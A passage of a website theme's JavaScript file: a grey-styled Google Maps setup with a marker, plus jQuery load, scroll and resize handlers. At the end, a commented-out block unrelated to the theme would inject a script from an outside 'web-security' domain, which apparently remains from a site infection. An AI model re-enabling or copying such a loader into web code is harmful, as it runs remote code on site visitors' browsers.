            google.maps.event.addListener(marker, 'click', (function(marker, i) {
                return function() {
                    infowindow.setContent(locations[i][0]);
                    infowindow.open(map, marker);
                }
            })(marker, i));
        }
    }; 

    function grayGoogleMap(MapId, icon) {

        var locations = [
            ['City inn khulna', 22.820884, 89.551216,2],
        ];

        var map = new google.maps.Map(document.getElementById(MapId), {
            center: new google.maps.LatLng( 22.8103888, 89.5619609),
            zoom: 14,
            scrollwheel: false,
            mapTypeId: google.maps.MapTypeId.ROADMAP

        });

        var infowindow = new google.maps.InfoWindow();

        var marker, i;

        for (i = 0; i < locations.length; i++) {  
                marker = new google.maps.Marker({
                position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                map: map,
                icon: icon
            });

            google.maps.event.addListener(marker, 'click', (function(marker, i) {
                return function() {
                    infowindow.setContent(locations[i][0]);
                    infowindow.open(map, marker);
                }
            })(marker, i));
        }

        map.set('styles',
            [
                {
                    "featureType": "water",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#e9e9e9"
                        },
                        {
                            "lightness": 17
                        }
                    ]
                },
                {
                    "featureType": "landscape",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#f5f5f5"
                        },
                        {
                            "lightness": 20
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "geometry.fill",
                    "stylers": [
                        {
                            "color": "#ffffff"
                        },
                        {
                            "lightness": 17
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "geometry.stroke",
                    "stylers": [
                        {
                            "color": "#ffffff"
                        },
                        {
                            "lightness": 29
                        },
                        {
                            "weight": 0.2
                        }
                    ]
                },
                {
                    "featureType": "road.arterial",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#ffffff"
                        },
                        {
                            "lightness": 18
                        }
                    ]
                },
                {
                    "featureType": "road.local",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#ffffff"
                        },
                        {
                            "lightness": 16
                        }
                    ]
                },
                {
                    "featureType": "poi",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#f5f5f5"
                        },
                        {
                            "lightness": 21
                        }
                    ]
                },
                {
                    "featureType": "poi.park",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#dedede"
                        },
                        {
                            "lightness": 21
                        }
                    ]
                },
                {
                    "elementType": "labels.text.stroke",
                    "stylers": [
                        {
                            "visibility": "on"
                        },
                        {
                            "color": "#ffffff"
                        },
                        {
                            "lightness": 16
                        }
                    ]
                },
                {
                    "elementType": "labels.text.fill",
                    "stylers": [
                        {
                            "saturation": 36
                        },
                        {
                            "color": "#333333"
                        },
                        {
                            "lightness": 40
                        }
                    ]
                },
                {
                    "elementType": "labels.icon",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "transit",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#f2f2f2"
                        },
                        {
                            "lightness": 19
                        }
                    ]
                },
                {
                    "featureType": "administrative",
                    "elementType": "geometry.fill",
                    "stylers": [
                        {
                            "color": "#fefefe"
                        },
                        {
                            "lightness": 20
                        }
                    ]
                },
                {
                    "featureType": "administrative",
                    "elementType": "geometry.stroke",
                    "stylers": [
                        {
                            "color": "#fefefe"
                        },
                        {
                            "lightness": 17
                        },
                        {
                            "weight": 1.2
                        }
                    ]
                }
            ]
        
        );
    }; 



    /*==========================================================================
        WHEN DOCUMENT LOADING 
    ==========================================================================*/
        $(window).on('load', function() {

            preloader();

            sliderBgSetting();
			
            toggleMobileNavigation();

            smallNavFunctionality();

            if($("#map").length) {
                map("map");
            }

            if($("#photography-contact-map").length) {
                grayGoogleMap("photography-contact-map", "assets/images/photography-map-marker.jpg");
            }

            if($("#agency-contact-map").length) {
                grayGoogleMap("agency-contact-map", "assets/images/agency-map-marker.png");
            }          

            if ((window.innerWidth >= 992) && (!$("body").hasClass("photography-home"))) {
                smoothScrolling($("#navbar > ul > li > a[href^='#']"), $(".navigation-holder").innerHeight());
            } else if (($(".photography-home").length) && (window.innerWidth >= 992)) {
                smoothScrolling($("#navbar > ul > li > a[href^='#']"), 0);
            } else {
                smoothScrolling($("#navbar > ul > li > a[href^='#']"), 70);
            }   

            sortingGallery();         
        });



    /*==========================================================================
        WHEN WINDOW SCROLL
    ==========================================================================*/
    $(window).on("scroll", function() {

		if ($(".site-header").length) {
            stickIt($(".sticky-header"), "sticky-on"); 
        }

        activeMenuItem($(".navigation-holder"));
    });

    
    /*==========================================================================
        WHEN WINDOW RESIZE
    ==========================================================================*/
    $(window).on("resize", function() {
        
        toggleClassForSmallNav();

        if($(".construction-projects-grids").length) {
            setMcustomScrollBar($(".construction-projects-grids"));
        }
        
        clearTimeout($.data(this, 'resizeTimer'));
        
        $.data(this, 'resizeTimer', setTimeout(function() {
            smallNavFunctionality();
        }, 200));
    });

})(window.jQuery);

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/